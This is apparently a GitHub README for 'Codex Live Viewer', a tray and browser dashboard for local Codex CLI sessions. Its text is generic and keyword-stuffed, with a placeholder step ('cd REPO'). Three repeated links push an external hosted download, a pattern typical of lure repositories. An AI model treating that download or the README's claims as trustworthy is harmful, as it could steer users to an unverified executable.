# Codex Live Viewer v2026 - dashboard 2026

> **A compact Windows and Linux dashboard for local Codex CLI sessions, with browser monitoring, system tray access, and real-time updates in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20and%20Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucaselnihall743/codex-live-session-viewer?style=flat-square)](https://github.com/lucaselnihall743/codex-live-session-viewer)

---

<p align="center">
  <a href="https://lucaselnihall743.github.io/codex-live-session-viewer/">
    <img src="https://img.shields.io/badge/Download-Codex%20Live%20Viewer%20Latest-brightgreen?style=for-the-badge" alt="Download Codex Live Viewer">
  </a>
</p>

> **[Download Codex Live Viewer v2026](https://lucaselnihall743.github.io/codex-live-session-viewer/)**

---

[Download Latest Build](https://lucaselnihall743.github.io/codex-live-session-viewer/)

---

## Overview

Codex Live Viewer presents a read-only browser interface for local Codex CLI sessions. It displays active work, session details, and status changes without interrupting your normal desktop workflow.

The application is intended for Windows and Linux users who need a more convenient way to observe Codex activity. Browser-based live updates, session search, and tray access make it easier to keep track of work that is already in progress.

---

## What It Provides

- Read-only web dashboard for local Codex CLI sessions
- Filesystem monitoring and SSE-based delivery of live session changes
- Search by session metadata and filtering by status
- Task controls for resume, exec resume, fork, archive, and unarchive commands
- Detection of stuck sessions, including Windows process inspection
- Native system tray launcher
- Desktop tray notifications
- Node.js and Rust-based implementation

---

## Getting Started

To build from source, clone the repository and install the dependencies required by your platform.

1. Clone the project:
   `git clone https://github.com/lucaselnihall743/codex-live-session-viewer.git
2. Enter the repository directory:
   `cd REPO`
3. Install dependencies and build the project using the setup appropriate for your platform.
4. Start the tray application or open the browser dashboard from the resulting build output.

You can use the download link above if you prefer a hosted build.

---

## Using the Viewer

After starting Codex Live Viewer, open its dashboard through the tray application or browser interface.

A normal session looks like this:

1. Start Codex Live Viewer.
2. Allow it to locate the local Codex CLI session data.
3. Review the available sessions in the dashboard.
4. Narrow the list with status filters or session metadata search.
5. Apply task actions to resume, fork, archive, or restore a session as needed.

While the dashboard is active, changes to session files on disk should be reflected in the interface.

---

## Settings

The viewer uses the project's settings together with the local paths where session data is stored.

Depending on the build, configuration may cover areas such as:

- dashboard refresh behavior
- system tray notification preferences
- location of the session source
- default filtering and search behavior

When a build uses a settings file, store it with the application's local configuration directory for the relevant platform.

---

## Requirements

- Windows or Linux
- A local environment containing Codex CLI sessions
- Node.js and Rust toolchain support when building from source
- Filesystem access to the location containing session metadata
- A browser for viewing the dashboard

---

## Frequently Asked Questions

### Is Codex Live Viewer a replacement for Codex CLI?

No. The CLI continues to provide the session activity; Codex Live Viewer adds a dashboard and tray-oriented way to observe those local sessions.

### How does the dashboard receive changes?

It monitors the session filesystem and sends updates to the browser through SSE.

### Are session searches supported?

Yes. The dashboard supports session status filters as well as searches based on session metadata.

### What is the purpose of the tray application?

The tray app provides fast access to the viewer and can display notifications through the desktop system tray.

### How are apparently stuck sessions handled?

The project offers stuck session detection. On Windows, it can also inspect related processes to provide more information about the session's state.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
